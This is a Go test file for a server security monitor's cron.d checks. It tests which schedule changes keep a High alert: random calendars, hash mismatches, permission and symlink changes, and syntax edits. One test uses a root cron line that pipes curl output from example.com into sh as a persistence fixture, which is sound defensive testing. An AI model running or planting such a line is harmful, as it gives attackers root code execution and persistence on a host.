package checks

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

func TestCronDScheduleDemotionRefusesRandomCalendarReload(t *testing.T) {
	withoutWriterProvenance(t)
	for _, calendar := range []string{"~ * *", "* ~ *", "* * ~", "1~28 * *", "* 1~12 *", "* * 1~5"} {
		t.Run(calendar, func(t *testing.T) {
			for _, tc := range []struct{ name, job string }{
				{"fixed time", "17 3 " + calendar + " root /usr/local/bin/job\n"},
				{"every minute", "* * " + calendar + " root /usr/local/bin/job\n"},
				{"logging disabled", "-17 3 " + calendar + " root /usr/local/bin/job\n"},
			} {
				t.Run(tc.name, func(t *testing.T) {
					before := dailyPanelJob(17, 3) + tc.job
					after := dailyPanelJob(42, 0) + tc.job
					if got := cronDRewrite(t, before, after); got.Severity != alert.High {
						t.Fatalf("finding = %+v; want High when reloading a random calendar", got)
					}
					if got := findingFor(t, watchsetRewrite(t, panelReissueCronD, before, after), panelReissueCronD); got.Severity != alert.High {
						t.Fatalf("refresh finding = %+v; want High when reloading a random calendar", got)
					}
				})
			}
		})
	}
}

func TestCronDScheduleDemotionKeepsLiteralTildes(t *testing.T) {
	withoutWriterProvenance(t)
	for _, surrounding := range []string{
		"# 17 3 ~ * * root job\n",
		"SETTING='17 3 ~ * * root job'\n",
		"CRON_TZ=UTC\nRANDOM_DELAY=1\n",
		"0 0 * * * root /usr/bin/printf '~'\n",
	} {
		got := cronDRewrite(t, surrounding+dailyPanelJob(17, 3), surrounding+dailyPanelJob(42, 0))
		if got.Severity != alert.Warning {
			t.Fatalf("finding = %+v; want Warning for a time move with unchanged literal bytes", got)
		}
	}
}

func TestCronDScheduleDemotionRequiresMatchingHashBaseline(t *testing.T) {
	withoutWriterProvenance(t)
	store := newCrontabTestStore(t)
	old := dailyPanelJob(17, 3)
	runCronDOnce(t, store, panelReissueCronD, old)
	// A save between the two baseline writes can retain the old fingerprint
	// beside the hash of a different command.
	store.SetRaw("_crond:"+filepath.Base(panelReissueCronD), hashBytes([]byte("17 3 * * * root /usr/local/bin/other\n")))
	got := cronDFinding(t, runCronDOnce(t, store, panelReissueCronD, dailyPanelJob(42, 0)))
	if got.Severity != alert.High {
		t.Fatalf("finding = %+v; want High when the fingerprint belongs to another hash", got)
	}
}

func TestSensitivePollerScheduleDemotionRequiresMatchingHashBaseline(t *testing.T) {
	withoutWriterProvenance(t)
	root := t.TempDir()
	path := filepath.Join(root, "etc/cron.d/job")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{path}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })
	write := func(content string) {
		t.Helper()
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	store := newCrontabTestStore(t)
	write(dailyPanelJob(17, 3))
	CheckSensitiveFiles(context.Background(), nil, store)
	store.SetRaw("_sensitive_file_hash:"+path, hashBytes([]byte("17 3 * * * root /usr/local/bin/other\n")))
	write(dailyPanelJob(42, 0))
	findings := CheckSensitiveFiles(context.Background(), nil, store)
	if len(findings) != 1 || findings[0].Severity != alert.High {
		t.Fatalf("findings = %+v; want one High when the fingerprint belongs to another hash", findings)
	}
}

func TestCronDScheduleDemotionKeepsDangerVetoForAllNames(t *testing.T) {
	withoutWriterProvenance(t)
	for _, name := range []string{"passwd", "group", "shadow", "gshadow", "sudoers", "sshd_config"} {
		t.Run(name, func(t *testing.T) {
			path := "/etc/cron.d/" + name
			before := "17 3 * * * root curl -s https://example.com/x | sh\n"
			after := "42 0 * * * root curl -s https://example.com/x | sh\n"
			got := findingFor(t, watchsetRewrite(t, path, before, after), path)
			if got.Severity != alert.High {
				t.Fatalf("finding = %+v; want High for cron persistence", got)
			}
		})
	}
}

func TestCronDScheduleDemotionRefusesPermissionActivation(t *testing.T) {
	withoutWriterProvenance(t)
	content := dailyPanelJob(17, 3)
	mode := os.FileMode(0o666)
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{panelReissueCronD}, nil
			}
			return nil, nil
		},
		readFile: func(string) ([]byte, error) { return []byte(content), nil },
		stat: func(string) (os.FileInfo, error) {
			return statWithMtime{name: panelReissueCronD, modTime: time.Now(), mode: mode}, nil
		},
		lstat: func(string) (os.FileInfo, error) {
			return statWithMtime{name: panelReissueCronD, modTime: time.Now(), mode: mode}, nil
		},
	})
	store := newCrontabTestStore(t)
	CheckCrontabs(context.Background(), &config.Config{}, store)
	content, mode = dailyPanelJob(42, 0), 0o644
	got := cronDFinding(t, CheckCrontabs(context.Background(), &config.Config{}, store))
	if got.Severity != alert.High {
		t.Fatalf("finding = %+v; want High when permissions activate a dormant job", got)
	}
}

func TestSensitivePollerScheduleDemotionRefusesPermissionActivation(t *testing.T) {
	withoutWriterProvenance(t)
	path := filepath.Join(t.TempDir(), "etc/cron.d/job")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{path}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })
	if err := os.WriteFile(path, []byte(dailyPanelJob(17, 3)), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o666); err != nil {
		t.Fatal(err)
	}
	store := newCrontabTestStore(t)
	CheckSensitiveFiles(context.Background(), nil, store)
	if err := os.WriteFile(path, []byte(dailyPanelJob(42, 0)), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o644); err != nil {
		t.Fatal(err)
	}
	findings := CheckSensitiveFiles(context.Background(), nil, store)
	if len(findings) != 1 || findings[0].Severity != alert.High {
		t.Fatalf("findings = %+v; want one High when permissions activate a dormant job", findings)
	}
}

func TestCronSchedulePollersRequireStablePathIdentity(t *testing.T) {
	withoutWriterProvenance(t)
	for _, backend := range []string{"scheduled", "legacy"} {
		for _, change := range []string{"symlink target", "unavailable metadata"} {
			t.Run(backend+"/"+change, func(t *testing.T) {
				path := filepath.Join(t.TempDir(), "etc/cron.d/job")
				content, target, readable := dailyPanelJob(17, 3), "original", true
				withMockOS(t, &mockOS{
					glob: func(pattern string) ([]string, error) {
						if pattern == "/etc/cron.d/*" {
							return []string{path}, nil
						}
						return nil, nil
					},
					readFile: func(string) ([]byte, error) { return []byte(content), nil },
					stat: func(string) (os.FileInfo, error) {
						return sensitiveTestFileInfo{name: "job", mode: 0o644}, nil
					},
					lstat: func(string) (os.FileInfo, error) {
						if !readable {
							return nil, os.ErrPermission
						}
						return sensitiveTestFileInfo{name: "job", mode: os.ModeSymlink | 0o777}, nil
					},
					readlink: func(string) (string, error) { return target, nil },
				})
				oldWatchset := sensitiveWatchset
				sensitiveWatchset = []string{path}
				t.Cleanup(func() { sensitiveWatchset = oldWatchset })
				store := newCrontabTestStore(t)
				run := func() []alert.Finding {
					if backend == "scheduled" {
						return CheckCrontabs(context.Background(), &config.Config{}, store)
					}
					return CheckSensitiveFiles(context.Background(), nil, store)
				}
				run()
				content = dailyPanelJob(42, 0)
				if change == "symlink target" {
					target = "replacement"
				} else {
					readable = false
				}
				got := run()
				if len(got) != 1 || got[0].Severity != alert.High {
					t.Fatalf("findings = %+v; want one High without stable metadata", got)
				}
			})
		}
	}
}

func TestCronDScheduleDemotionPreservesExecutionSyntax(t *testing.T) {
	withoutWriterProvenance(t)
	job := dailyPanelJob(17, 3)
	for _, tc := range []struct{ name, before, after string }{
		{"stdin changed", "17 3 * * * root /usr/bin/cat%one\n", "42 0 * * * root /usr/bin/cat%two\n"},
		{"stdin escape changed", "17 3 * * * root /usr/bin/printf \\%one\n", "42 0 * * * root /usr/bin/printf %one\n"},
		{"timezone changed", "CRON_TZ=UTC\n" + job, "CRON_TZ=Europe/Bucharest\n" + dailyPanelJob(42, 0)},
		{"delay changed", "RANDOM_DELAY=0\n" + job, "RANDOM_DELAY=1\n" + dailyPanelJob(42, 0)},
		{"final newline added", strings.TrimSuffix(job, "\n"), dailyPanelJob(42, 0)},
		{"carriage return removed", strings.ReplaceAll(job, "\n", "\r\n"), dailyPanelJob(42, 0)},
		{"shorthand activated", "@invalid root /usr/local/bin/job\n" + job, "@reboot root /usr/local/bin/job\n" + dailyPanelJob(42, 0)},
		{"jobs reordered", job + "5 4 * * * root /usr/local/bin/other\n", "5 4 * * * root /usr/local/bin/other\n" + dailyPanelJob(42, 0)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := cronDRewrite(t, tc.before, tc.after); got.Severity != alert.High {
				t.Fatalf("finding = %+v; want High for changed execution syntax", got)
			}
		})
	}
}
